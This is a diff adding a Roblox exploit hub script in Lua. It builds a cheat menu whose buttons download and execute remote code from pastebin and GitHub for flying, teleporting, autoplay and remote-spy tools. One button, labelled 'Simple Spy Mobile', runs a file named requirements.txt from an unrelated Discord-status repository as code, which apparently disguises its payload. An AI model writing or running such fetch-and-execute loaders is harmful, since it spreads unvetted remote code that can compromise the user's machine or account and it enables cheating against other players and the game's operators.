@@ -1,0 +1,58 @@
+local Libary = loadstring(game:HttpGet("https://github.com/TheMugenKingMods/Redz-Gui-Library/raw/refs/heads/main/Q"))()
+workspace.FallenPartsDestroyHeight = -math.huge
+
+local Window = Libary:MakeWindow({
+    Title = "CreatorofScript",
+    SubTitle = "by: ZR Team",
+    LoadText = "TheMugenKing Developers",
+    Flags = "TheMugenKing"
+})
+
+Window:AddMinimizeButton({
+    Button = { Image = "rbxassetid://136687982905395", BackgroundTransparency = 0 },
+    Corner = { CornerRadius = UDim.new(35, 1) },
+})
+
+local InfoTab = Window:MakeTab({ Title = "Info", Icon = "rbxassetid://114515690129915" })
+
+InfoTab:AddButton({
+    Name = "Fly Player",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/HKPm33Pq'))()
+    end
+})
+
+InfoTab:AddButton({
+    Name = "f3x",
+    Callback = function()
+        loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
+    end
+})
+
+InfoTab:AddButton({
+    Name = "AutoPlay Player",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureNeoX/Autoplay/refs/heads/main/Q",true))()
+    end
+})
+
+InfoTab:AddButton({
+    Name = "Teleport Tool Player",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureNeoX/Teleport-Tool/refs/heads/main/Q", true))()
+    end
+})
+
+InfoTab:AddButton({
+    Name = "Sigma Spy",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/depthso/Sigma-Spy/refs/heads/main/Main.lua"))()
+    end
+})
+
+InfoTab:AddButton({
+    Name = "Simple Spy Mobile",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
+    end
+})
